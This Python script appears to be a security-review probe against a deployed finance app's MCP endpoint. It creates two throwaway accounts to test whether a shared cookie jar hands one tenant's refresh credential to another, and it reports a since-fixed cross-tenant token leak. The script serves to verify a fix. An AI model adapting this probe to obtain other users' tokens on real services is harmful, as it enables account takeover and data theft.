"""Live probe: is the MCP process's httpx cookie jar shared across tenants?

Creates two throwaway accounts on the deployed ASP (or reuses the pair from a
previous run via state.json), mints one MCP token each, then:

  session B: users_me            -> learn B's user id
  session A: users_me, auth_login -> learn A's user id; deposit A's refresh
                                     cookie in the shared httpx jar
  session B: auth_refresh()      -> if the returned access token's `sub` is
                                     A's id, tenant B just received tenant
                                     A's credential from a shared cookie jar.

Only our own two throwaway accounts are touched.
"""

from __future__ import annotations

import asyncio
import base64
import json
import pathlib
import secrets
import sys

import httpx

BASE = "https://fintrac.princessandmark.com"
API = f"{BASE}/api/v1"
MCP_URL = f"{BASE}/mcp/mcp"
STATE = pathlib.Path(__file__).with_name("jar_leak_state.json")


def b64url_decode(seg: str) -> bytes:
    return base64.urlsafe_b64decode(seg + "=" * (-len(seg) % 4))


def jwt_sub(token: str) -> str | None:
    try:
        return str(json.loads(b64url_decode(token.split(".")[1])).get("sub"))
    except Exception as exc:  # noqa: BLE001
        return f"<decode error: {exc}>"


def register(client: httpx.Client, email: str, password: str) -> dict:
    """M87: POST /auth/register answers 200 and opens NO session (docs/42 §1),
    so the token this probe needs comes from an explicit sign-in — the same
    recovery path a real user follows after registering."""
    r = client.post(f"{API}/auth/register", json={"email": email, "password": password})
    print(f"  register {email}: {r.status_code}")
    r.raise_for_status()
    l = client.post(f"{API}/auth/login", json={"email": email, "password": password})
    print(f"  login {email}: {l.status_code}")
    l.raise_for_status()
    return l.json()


def mint(client: httpx.Client, access: str, name: str) -> str:
    r = client.post(
        f"{API}/auth/mcp-tokens",
        json={"name": name},
        headers={"Authorization": f"Bearer {access}"},
    )
    print(f"  mint {name}: {r.status_code}")
    r.raise_for_status()
    return r.json()["token"]


async def mcp_call(token: str, tool: str, args: dict | None = None) -> dict:
    from mcp import ClientSession
    from mcp.client.streamable_http import streamable_http_client

    http_client = httpx.AsyncClient(
        headers={"Authorization": f"Bearer {token}"},
        timeout=httpx.Timeout(30.0, connect=10.0),
    )
    out: dict = {}
    try:
        async with streamable_http_client(MCP_URL, http_client=http_client) as (
            read,
            write,
        ):
            async with ClientSession(read, write) as session:
                await session.initialize()
                res = await session.call_tool(tool, args or {})
                out["isError"] = bool(getattr(res, "is_error", getattr(res, "isError", False)))
                out["content"] = [
                    (c.text if getattr(c, "text", None) else str(c))
                    for c in res.content  # type: ignore[attr-defined]
                ]
    finally:
        await http_client.aclose()
    return out


def load_or_create(state: dict) -> dict:
    if STATE.exists():
        print("== reusing state.json from a previous run ==")
        return json.loads(STATE.read_text())
    stamp = secrets.token_hex(3)
    pw = "SecReview-" + secrets.token_hex(8)
    emails = {
        "A": f"secreview-a-{stamp}@example.com",
        "B": f"secreview-b-{stamp}@example.com",
    }
    with httpx.Client(timeout=30.0) as c:
        print("== creating throwaway tenants ==")
        body_a = register(c, emails["A"], pw)
        body_b = register(c, emails["B"], pw)
        print("== minting MCP tokens ==")
        tok_a = mint(c, body_a["access_token"], f"secreview-a-{stamp}")
        tok_b = mint(c, body_b["access_token"], f"secreview-b-{stamp}")
    out = {
        "emails": emails,
        "password": pw,
        "ids": {
            "A": jwt_sub(body_a["access_token"]),
            "B": jwt_sub(body_b["access_token"]),
        },
        "tokens": {"A": tok_a, "B": tok_b},
    }
    STATE.write_text(json.dumps(out, indent=2))
    return out


def main() -> int:
    st = load_or_create({})
    ids, tokens, emails, pw = st["ids"], st["tokens"], st["emails"], st["password"]
    print(f"  A user id = {ids['A']}, B user id = {ids['B']}")

    print("== proof ==")
    r_b = asyncio.run(mcp_call(tokens["B"], "users_me", {}))
    print(f"  B users_me isError={r_b['isError']} -> {''.join(r_b['content'])[:300]}")

    r_a = asyncio.run(mcp_call(tokens["A"], "users_me", {}))
    print(f"  A users_me isError={r_a['isError']} -> {''.join(r_a['content'])[:300]}")

    r_login = asyncio.run(
        mcp_call(tokens["A"], "auth_login", {"email": emails["A"], "password": pw})
    )
    login_txt = "".join(r_login["content"])
    try:
        a_login_sub = jwt_sub(json.loads(login_txt).get("access_token", ""))
    except Exception:
        a_login_sub = None
    print(f"  A auth_login isError={r_login['isError']} sub={a_login_sub}")
    print(f"  A auth_login body -> {login_txt[:300]}")
    try:
        login_code = (json.loads(login_txt).get("detail") or {}).get("code")
    except Exception:
        login_code = None
    print(f"  A auth_login envelope code = {login_code!r}")

    r_ref = asyncio.run(mcp_call(tokens["B"], "auth_refresh", {}))
    ref_txt = "".join(r_ref["content"])
    print(f"  B auth_refresh isError={r_ref['isError']} -> {ref_txt[:600]}")
    try:
        ref_payload = json.loads(ref_txt)
    except Exception:
        ref_payload = {}
    ref_code = (ref_payload.get("detail") or {}).get("code")
    try:
        b_got_sub = jwt_sub(ref_payload.get("access_token", ""))
    except Exception:
        b_got_sub = None

    print()
    print(f"  tenant A id = {ids['A']}")
    print(f"  tenant B id = {ids['B']}")
    print(f"  A auth_login refused = {login_code == 'auth_tools_unavailable_on_mcp'}")
    print(f"  auth_refresh under MCP token B returned sub = {b_got_sub}")
    print(f"  auth_refresh envelope code = {ref_code!r}")

    if ref_code == "auth_tools_unavailable_on_mcp":
        print("  RESULT: REFUSED - auth_refresh is unavailable on the MCP HTTP path")
        print("          (M84 / docs/40 s2). No token was returned at all, so no")
        print("          cross-tenant credential could be disclosed; the jar is")
        print("          empty by construction. Pre-fix verdict was CROSS-TENANT")
        print("          TOKEN LEAK (B received A's access token, sub=124).")
        return 3
    if b_got_sub == ids["A"]:
        print("  RESULT: CROSS-TENANT TOKEN LEAK CONFIRMED (B received A's access token)")
        return 2
    if b_got_sub == ids["B"]:
        print("  RESULT: no leak - refresh returned B's own session")
        return 1
    print("  RESULT: inconclusive")
    return 0


if __name__ == "__main__":
    sys.exit(main())